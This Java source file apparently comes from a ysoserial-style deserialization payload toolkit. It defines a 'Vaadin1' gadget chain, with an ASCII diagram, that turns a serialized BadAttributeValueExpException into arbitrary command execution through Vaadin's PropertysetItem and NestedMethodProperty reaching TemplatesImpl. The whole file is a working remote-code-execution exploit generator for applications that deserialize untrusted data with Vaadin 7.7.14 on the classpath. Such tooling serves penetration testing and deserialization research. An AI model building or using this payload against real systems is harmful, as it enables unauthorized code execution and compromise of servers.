package payloads;

import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.Gadgets;
import util.PayloadRunner;
import util.Reflections;

import javax.management.BadAttributeValueExpException;

@Dependencies ( { "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
@Authors({ Authors.KULLRICH })
public class Vaadin1 implements ObjectPayload<Object>
{
//  +-------------------------------------------------+
//  |                                                 |
//  |  BadAttributeValueExpException                  |
//  |                                                 |
//  |  val ==>  PropertysetItem                       |
//  |                                                 |
//  |  readObject() ==> val.toString()                |
//  |          +                                      |
//  +----------|--------------------------------------+
//             |
//             |
//             |
//        +----|-----------------------------------------+
//        |    v                                         |
//        |  PropertysetItem                             |
//        |                                              |
//        |  toString () => getPropertyId().getValue ()  |
//        |                                       +      |
//        +---------------------------------------|------+
//                                                |
//                  +-----------------------------+
//                  |
//            +-----|----------------------------------------------+
//            |     v                                              |
//            |  NestedMethodProperty                              |
//            |                                                    |
//            |  getValue() => java.lang.reflect.Method.invoke ()  |
//            |                                           |        |
//            +-------------------------------------------|--------+
//                                                        |
//                    +-----------------------------------+
//                    |
//                +---|--------------------------------------------+
//                |   v                                            |
//                |  TemplatesImpl.getOutputProperties()           |
//                |                                                |
//                +------------------------------------------------+
    
    @Override
    public Object getObject (String command) throws Exception
    {
        Object templ = Gadgets.createTemplatesImpl (command);
        PropertysetItem pItem = new PropertysetItem ();        
        
        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templ, "outputProperties");
        pItem.addItemProperty ("outputProperties", nmprop);
        
        BadAttributeValueExpException b = new BadAttributeValueExpException ("");
        Reflections.setFieldValue (b, "val", pItem);
        
        return b;
    }

    public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(Vaadin1.class, command, fusion);
    }
}
